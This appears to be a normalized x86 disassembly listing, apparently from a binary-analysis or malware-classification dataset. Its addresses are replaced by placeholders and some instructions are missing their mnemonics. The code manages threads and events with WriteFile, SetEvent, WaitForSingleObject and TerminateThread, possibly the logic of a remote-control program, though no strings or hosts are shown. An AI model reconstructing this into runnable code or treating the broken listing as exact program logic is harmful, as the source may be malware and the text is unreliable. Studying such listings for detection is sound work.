lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor eax eax
lea edi [ ebp - 0x15 ]
stosd [ edi ]
push 0x1ff
stosb [ edi ]
xor esi esi
lea eax [ ebp - 0x22b ]
push esi
push eax
mov [ ebp - 0x22c ] 0x0
call sub_42b5a0
push [ ebx + 0x8 ]
add ebx 0xc
lea eax [ ebp - 0x22c ]
push ebx
push eax
call sub_4285a0
lea eax [ ebp - 0x22c ]
add esp 0x18
mov [ ebp - 0x24c ] esi
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push esi
lea ecx [ ebp - 0x24c ]
push ecx
push eax
lea eax [ ebp - 0x22c ]
push eax
push [ rw-data ]
call [ WriteFile@IAT ]
push 0x4
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_423792
add esp 0xc
test eax eax
jne r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x248 ]
call sub_40415f
xor eax eax
inc eax
call sub_425e60
retn
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x3e8
call [ Sleep@IAT ]
call sub_402c37
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea ecx [ ebp - 0x248 ]
push ecx
lea ecx [ ebp - 0x24 ]
sub eax edx
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
mov ecx [ ebp - 0x250 ]
lea edx [ ebp - 0x2c ]
push edx
lea edx [ ebp - 0x248 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
sub_40362c
push ebp
sub esp 0x2ec
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2ec ] eax
push 0x28
mov eax sub_43e5cf
call sub_425dad
mov eax [ ebp + 0x2f8 ]
mov esi ecx
xor ebx ebx
push ebx
lea ecx [ ebp ]
mov [ ebp - 0x10 ] eax
mov [ ebp + 0x18 ] 0xf
call sub_404490
mov edi 0xff
push edi
lea eax [ ebp + 0x39 ]
push ebx
mov [ ebp - 0x4 ] ebx
push eax
mov [ ebp + 0x38 ] bl
call sub_42b5a0
push edi
lea eax [ ebp + 0x139 ]
push ebx
push eax
mov [ ebp + 0x138 ] bl
call sub_42b5a0
push 0x7
mov [ ebp + 0x2cc ] bl
xor eax eax
pop ecx
lea edi [ ebp + 0x2cd ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ esi + 0xc ]
push edi
lea ecx [ ebp + 0x38 ]
mov edx r--data
call sub_402060
mov esi r--data
push edi
lea ecx [ ebp + 0x138 ]
mov edx esi
call sub_402060
push edi
mov edi r--data
lea ecx [ ebp + 0x2cc ]
mov edx edi
call sub_402060
lea eax [ ebp + 0x138 ]
push r--data
push eax
call sub_423e30
add esp 0x2c
mov [ ebp - 0x18 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp + 0x138 ]
push r--data
push eax
call sub_423e30
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push eax
call sub_42c50d
push eax
call sub_43a1a2
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_42462f
lea eax [ ebp + 0x2cc ]
push eax
call sub_423a43
add esp 0x10
cmp [ ebp - 0x14 ] eax
jl r-xdata
push 0x5
pop ecx
mov esi r--data
lea edi [ ebp + 0x278 ]
[ edi ] [ esi ]
push 0x2b
lea eax [ ebp + 0x28d ]
push ebx
push eax
movsb [ edi ] [ esi ]
call sub_42b5a0
lea eax [ ebp + 0x278 ]
add esp 0xc
lea edx [ eax + 0x1 ]
push eax
call sub_42462f
lea ecx [ ebp + 0x1c ]
mov [ esp ] r--data
call sub_403dc1
lea eax [ ebp + 0x38 ]
push eax
push r--data
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x4
call sub_40202a
lea eax [ ebp + 0x138 ]
push eax
push esi
lea eax [ ebp + 0x1c ]
call sub_40202a
push r--data
push edi
lea eax [ ebp + 0x1c ]
call sub_40202a
mov eax [ ebp + 0x20 ]
add esp 0x18
cmp [ ebp + 0x34 ] 0x10
jae r-xdata
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push 0xa
lea eax [ ebp + 0x2b8 ]
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x2
call sub_43a178
lea eax [ ebp + 0x38 ]
push eax
push r--data
lea eax [ ebp + 0x1c ]
call sub_40202a
lea eax [ ebp + 0x138 ]
push eax
push esi
lea eax [ ebp + 0x1c ]
call sub_40202a
lea eax [ ebp + 0x2b8 ]
push eax
push edi
lea eax [ ebp + 0x1c ]
call sub_40202a
mov eax [ ebp + 0x20 ]
add esp 0x24
cmp [ ebp + 0x34 ] 0x10
jae r-xdata
push 0x10
pop ecx
push 0x40
lea eax [ ebp + 0x278 ]
push ebx
mov esi r--data
lea edi [ ebp + 0x238 ]
push eax
[ edi ] [ esi ]
call sub_42b5a0
lea eax [ ebp + 0x238 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x278 ]
sub eax edx
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x34 ]
call sub_403dc1
mov ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x34 ]
push edx
lea edx [ ebp ]
mov [ ebp - 0x4 ] 0x6
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
lea ecx [ ebp - 0x34 ]
lea ecx [ ebp ]
push ecx
mov ecx [ ebp + 0x30 ]
push eax
call sub_402564
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x34 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
lea eax [ ebp + 0x20 ]
lea ecx [ ebp ]
push ecx
mov ecx [ ebp + 0x30 ]
push eax
call sub_402564
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x34 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp + 0x20 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x238 ]
sub eax edx
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
mov ecx [ ebp - 0x10 ]
lea edx [ ebp + 0x1c ]
push edx
lea edx [ ebp ]
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
lea edx [ ebp - 0x34 ]
push edx
lea edx [ ebp ]
push edx
call [ eax + 0x8 ]
push ebx
push 0x1
lea ecx [ ebp - 0x34 ]
call sub_40415f
jmp r-xdata
lea ecx [ ebp + 0x1c ]
jmp r-xdata
push ebx
push 0x1
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp ]
call sub_40415f
xor eax eax
inc eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x2ec ]
xor ecx ebp
call sub_4234de
add ebp 0x2f0
leave
retn
sub_40397a
push esi
push edi
mov esi eax
add esi 0x8
push r--data
push esi
call sub_423e30
push 0x2
mov edi eax
push 0x0
push edi
call sub_424424
push edi
push 0x1
push [ esi + 0x118 ]
add esi 0x11c
push esi
call sub_424318
push edi
call sub_42462f
add esp 0x28
xor eax eax
pop edi
inc eax
pop esi
retn
sub_4039bc
push ebp
sub esp 0x23c
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x23c ] eax
push 0x20
mov eax sub_43eb8c
call sub_425dad
mov eax [ ebp + 0x248 ]
mov esi ecx
xor ebx ebx
push ebx
lea ecx [ ebp ]
mov [ ebp - 0x10 ] eax
mov [ ebp + 0x18 ] 0xf
call sub_404490
mov edi 0xff
push edi
lea eax [ ebp + 0x11d ]
push ebx
mov [ ebp - 0x4 ] ebx
push eax
mov [ ebp + 0x11c ] bl
call sub_42b5a0
push edi
lea eax [ ebp + 0x1d ]
push ebx
push eax
mov [ ebp + 0x1c ] bl
call sub_42b5a0
push 0x7
mov [ ebp + 0x21c ] bl
xor eax eax
pop ecx
lea edi [ ebp + 0x21d ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ esi + 0xc ]
push edi
lea ecx [ ebp + 0x11c ]
mov edx r--data
call sub_402060
push edi
lea ecx [ ebp + 0x1c ]
mov edx r--data
call sub_402060
push edi
lea ecx [ ebp + 0x21c ]
mov edx r--data
call sub_402060
lea eax [ ebp + 0x1c ]
push r--data
push eax
call sub_423e30
mov esi eax
add esp 0x2c
cmp esi ebx
je r-xdata
push 0x9
pop ecx
mov esi r--data
lea edi [ ebp + 0x19c ]
[ edi ] [ esi ]
push 0x5a
lea eax [ ebp + 0x1c2 ]
push ebx
push eax
movsw [ edi ] [ esi ]
call sub_42b5a0
lea eax [ ebp + 0x19c ]
add esp 0xc
lea edx [ eax + 0x1 ]
push esi
call sub_42c50d
push eax
call sub_43a1a2
push esi
mov edi eax
call sub_42462f
lea eax [ ebp + 0x21c ]
push eax
call sub_423a43
add esp 0x10
cmp edi eax
jle r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x19c ]
sub eax edx
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x2
push 0xf
pop ecx
push 0xc4
lea eax [ ebp + 0x158 ]
push ebx
mov esi r--data
lea edi [ ebp + 0x11c ]
push eax
[ edi ] [ esi ]
call sub_42b5a0
lea eax [ ebp + 0x11c ]
add esp 0xc
lea esi [ eax + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
xor eax eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x11c ]
sub eax esi
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov cl [ ebp + eax + 0x21c ]
mov [ eax + rw-data ] cl
inc eax
cmp cl bl
jne r-xdata
xor eax eax
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
lea edx [ ebp - 0x2c ]
push edx
lea edx [ ebp ]
push edx
call [ eax + 0x8 ]
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov cl [ ebp + eax + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
cmp cl bl
jne r-xdata
xor eax eax
mov cl [ ebp + eax + 0x11c ]
mov [ eax + rw-data ] cl
inc eax
cmp cl bl
jne r-xdata
push ebx
push ebx
push rw-data
push sub_402986
push ebx
push ebx
call sub_423b4f
add esp 0x18
mov [ rw-data ] eax
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp ]
call sub_40415f
xor eax eax
inc eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x23c ]
xor ecx ebp
call sub_4234de
add ebp 0x240
leave
retn
sub_403c18
push 0x80
mov eax sub_43e56f
call sub_425e16
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x54 ] 0xf
call sub_404490
mov [ ebp - 0x4 ] ebx
cmp [ rw-data ] ebx
je r-xdata
mov esi r--data
lea edi [ ebp - 0x50 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x31
lea eax [ ebp - 0x41 ]
push ebx
push eax
movsb [ edi ] [ esi ]
call sub_42b5a0
lea eax [ ebp - 0x50 ]
add esp 0xc
lea edx [ eax + 0x1 ]
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x7d0
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea ecx [ ebp - 0x6c ]
push ecx
lea ecx [ ebp - 0x50 ]
sub eax edx
push ecx
mov ecx eax
call sub_402490
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x8c ]
call sub_403dc1
mov ecx [ ebp - 0x70 ]
lea edx [ ebp - 0x8c ]
push edx
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
push edx
call [ eax + 0x8 ]
push ebx
push 0x1
lea ecx [ ebp - 0x8c ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x6c ]
call sub_40415f
xor eax eax
inc eax
call sub_425e60
retn
push ebx
push [ rw-data ]
call [ TerminateThread@IAT ]
mov [ rw-data ] ebx
sub_403d04
push ebx
push ebp
push esi
mov esi [ SetEvent@IAT ]
xor ebp ebp
push edi
mov edi [ WaitForSingleObject@IAT ]
mov ebx 0x7d0
cmp [ rw-data ] ebp
je r-xdata
cmp [ rw-data ] ebp
je r-xdata
push [ rw-data ]
call esi
push ebx
push [ rw-data ]
call edi
test eax eax
je r-xdata
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
cmp eax ebp
je r-xdata
push [ rw-data ]
call esi
push ebx
push [ rw-data ]
call edi
test eax eax
je r-xdata
push ebp
push [ rw-data ]
call [ TerminateThread@IAT ]
mov [ rw-data ] ebp
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
call esi
mov [ rw-data ] ebp
push ebp
push [ rw-data ]
call [ TerminateThread@IAT ]
mov [ rw-data ] ebp
pop edi
pop esi
pop ebp
pop ebx
jmp sub_402c37
push eax
call esi
mov [ rw-data ] ebp
sub_403de3
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_404490
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov ecx esi
call sub_40400a
mov eax esi
pop esi
retn 0x4
sub_403e09
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi eax
cmp [ esi + 0x18 ] 0x10
lea eax [ esi + 0x4 ]
push edi
mov [ ebp - 0x4 ] eax
jb r-xdata
mov ebx [ esi + 0x14 ]
add ebx eax
lea edi [ ebp - 0x1c ]
call sub_404708
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ eax ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
jmp r-xdata
lea edi [ ebp - 0xc ]
call sub_404708
cmp [ esi + 0x18 ] 0x10
jb r-xdata
lea ebx [ eax + edi ]
lea edi [ ebp - 0x1c ]
call sub_404708
pop edi
pop esi
pop ebx
leave
retn
mov eax [ eax ]
lea edi [ ebp - 0x14 ]
call sub_404708
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call sub_40450a
push [ ebp - 0x8 ]
mov edi eax
push [ ebp - 0xc ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_40450a
add esp 0x20
push eax
push edi
mov ecx esi
call sub_4043e3
cmp [ esi + 0x18 ] 0x10
mov eax [ ebp - 0x4 ]
jb r-xdata
sub_403eaa
push esi
mov esi eax
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_423d5c
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop esi
retn
sub_403eca
mov eax [ esp + 0x8 ]
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push [ esp + 0xc ]
mov eax [ esp + 0x14 ]
push [ esp + 0xc ]
call sub_4040bf
retn 0xc
sub_403eef
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_40421b
and [ esi + 0x18 ] 0x0
mov [ esi + 0x14 ] eax
mov eax esi
call sub_425e4c
retn 0x4
sub_403f4b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
cmp esi eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ eax + 0x14 ]
mov ebx [ eax ]
mov eax [ edi ]
mov [ esp + 0x14 ] eax
call sub_404534
mov eax [ esi + 0x14 ]
mov eax [ eax ]
mov ecx [ esi ]
push edi
push ebx
push [ esp + 0x1c ]
push ebx
push eax
push ecx
push esi
call sub_4047a7
sub_403fc6
or eax 0xffffffff
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_422b4b
mov eax edi
retn 0x4
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_4044ac
test al al
je r-xdata
pop esi
mov dl [ esp + 0x8 ]
mov ecx [ edi + 0x14 ]
push ebx
mov eax edi
call sub_404452
push esi
mov ecx edi
call sub_404490
sub_40400a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_422b83
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_4044ac
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_4043e3
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_4043e3
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
add edi edx
push edi
push ecx
push eax
call sub_40102d
add esp 0x10
push esi
mov ecx ebx
call sub_404490
sub_40409c
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_404371
pop esi
retn 0x4
sub_4040bf
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
jne r-xdata
push ebx
mov ebx [ ecx + 0x14 ]
push esi
push edi
cmp eax ebx
jae r-xdata
cmp eax [ ecx + 0x14 ]
jbe r-xdata
or eax 0xffffffff
sub ebx eax
cmp [ ebp + 0x10 ] ebx
ja r-xdata
leave
retn 0xc
xor edx edx
inc edx
sub edx [ ebp + 0x10 ]
add ebx edx
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov [ ebp - 0x8 ] ecx
add ecx 0x4
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
jmp r-xdata
call sub_423980
add esp 0xc
test eax eax
jne r-xdata
add eax ecx
mov ecx [ ebp + 0xc ]
movsx ecx [ ecx ]
push ebx
push ecx
mov [ ebp - 0x4 ] eax
push eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x18 ] 0x10
mov ecx [ ebp - 0x8 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx eax
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
movsx eax [ eax ]
lea ebx [ ebx + ecx - 0x1 ]
push ebx
push eax
push [ ebp - 0x4 ]
sub eax ecx
jmp r-xdata
mov ecx [ ecx ]
pop edi
pop esi
pop ebx
sub_40415f
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_404490
pop esi
retn 0x8
cmp [ esi + 0x18 ] 0x10
jb r-xdata
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_42412e
pop ecx
pop edi
push [ esp + 0x10 ]
push edi
push 0x10
push eax
call sub_40102d
add esp 0x10
sub_4041aa
push 0x48
mov eax sub_43b0d8
call sub_425dad
mov eax [ ebp + 0x10 ]
push [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push [ esi ]
push eax
call sub_40456b
mov ecx [ edi + 0x18 ]
mov edx 0x9249249
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x18 ] ecx
mov [ esi ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
call sub_425e4c
retn 0xc
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
sub_404233
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x14 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax [ ebp + 0x8 ]
cmp eax ebx
jae r-xdata
call sub_422b83
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0xc ] ebx
call sub_422b4b
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop ebx
leave
retn 0x8
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_4044ac
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
push [ ebp + 0xc ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0x8 ]
add edi ebx
sub eax ecx
push edi
push eax
add ecx edx
push ecx
call sub_40102d
add esp 0x10
push [ ebp - 0x4 ]
mov ecx esi
call sub_404490
sub_4042d7
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi eax
push edi
mov ecx esi
call sub_4046cd
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_422b4b
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebx
retn 0x8
sub edi eax
push ebx
push edi
mov eax esi
call sub_404233
jmp r-xdata
mov eax esi
mov edi [ esi + 0x14 ]
push 0x0
add edi ebx
push edi
mov ecx esi
call sub_4044ac
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push ebx
push [ esp + 0x14 ]
sub eax ecx
push eax
add ecx edx
push ecx
call sub_40102d
add esp 0x10
push edi
mov ecx esi
call sub_404490
sub_404371
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_4046cd
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_4044ac
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_40400a
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_40102d
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_404490
sub_4043e3
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_422b83
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ebx edx
mov ebx [ edx ]
jmp r-xdata
sub eax [ ebp + 0xc ]
add ebx edi
add ebx [ ebp + 0xc ]
push eax
push ebx
sub ecx edi
push ecx
add edx edi
push edx
call sub_401049
mov eax [ esi + 0x14 ]
sub eax [ ebp + 0xc ]
add esp 0x10
push eax
mov ecx esi
call sub_404490
pop ebx
mov edx [ edx ]
cmp ecx 0x10
jb r-xdata
sub_404452
cmp [ esp + 0x4 ] 0x1
jne r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push [ esp + 0x4 ]
movsx edx dl
push edx
add eax ecx
push eax
call sub_42b5a0
add esp 0xc
retn 0x4
mov [ eax + ecx ] dl
jmp r-xdata
sub_4044ac
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xfffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_422b4b
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_4045eb
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push edi
mov ecx esi
call sub_404490
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_40415f
jmp r-xdata
mov eax edi
sub_40450a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffc
je r-xdata
pop ebp
retn
sub eax [ ebp + 0x14 ]
pop ebp
retn
test ecx ecx
je r-xdata
call sub_423d5c
mov eax [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
je r-xdata
sub_404534
mov eax [ esi + 0x14 ]
push edi
mov edi [ eax ]
mov [ eax ] eax
mov eax [ esi + 0x14 ]
mov [ eax + 0x4 ] eax
and [ esi + 0x18 ] 0x0
cmp edi [ esi + 0x14 ]
je r-xdata
pop edi
retn
push ebx
mov ebx [ edi ]
push 0x0
push 0x1
lea ecx [ edi + 0x8 ]
call sub_40415f
push edi
call sub_42412e
pop ecx
mov edi ebx
cmp ebx [ esi + 0x14 ]
jne r-xdata
pop ebx
sub_40456b
push 0x8
mov eax sub_43aa62
call sub_425de0
push 0x24
call sub_4246c6
and [ ebp - 0x4 ] 0x0
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
lea ecx [ esi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov eax esi
call sub_425e4c
retn 0xc
push [ ebp + 0x10 ]
call sub_403de3
sub_4045eb
push 0xc
mov eax sub_43a79c
call sub_425de0
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
